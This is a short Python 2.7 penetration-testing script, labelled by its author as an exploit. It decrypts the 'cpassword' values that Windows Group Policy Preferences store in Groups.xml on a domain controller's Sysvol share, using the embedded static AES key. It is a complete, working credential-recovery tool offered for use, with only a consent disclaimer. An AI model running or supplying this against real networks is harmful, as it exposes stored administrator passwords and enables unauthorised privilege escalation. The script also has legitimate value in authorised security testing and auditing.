#!/usr/bin/env python2.7

# Author: m8r0wn
# Script: gppdecrypt.py
# Category: Exploit

# Description:
# This tool decrypts the cpassword attribute value embedded in the Groups.xml file,
# stored in the domain controller's Sysvol share. This tool was modified from the
# original gpprefdecrypt.py

# Disclaimer:
# This tool was designed to be used only with proper
# consent. Use at your own risk.


import sys
from Crypto.Cipher import AES
from base64 import b64decode
sys.path.append('../resources/')
import coretools

def banner():
    print """
              Gpprefdecrypt

    Decrypt windows GPP \"cpassword\" values.

    Usage:
    gppdecrypt.py [cpassword]

    """
    sys.exit(0)

def decrypt():
    try:
        # Init the key
        # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
        key = """
      4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
      f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
      """.replace(" ", "").replace("\n", "").decode('hex')

        # Add padding to the base64 string and decode it
        cpassword = sys.argv[-1]
        cpassword += "=" * ((4 - len(sys.argv[-1]) % 4) % 4)
        password = b64decode(cpassword)

        # Decrypt the password
        o = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)

        # Output
        print "\n[*] Decrypted password:  ", o[:-ord(o[-1])].decode('utf16'), "\n\n"
    except:
        print "\n[!] Error could not decrypt cpassword value\n\n"

def main():
    if (len(sys.argv) < 2) or "-h" in sys.argv:
        banner()
    else:
        decrypt()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        coretools.exit("\n[!] Key Event Detected...\n\n")



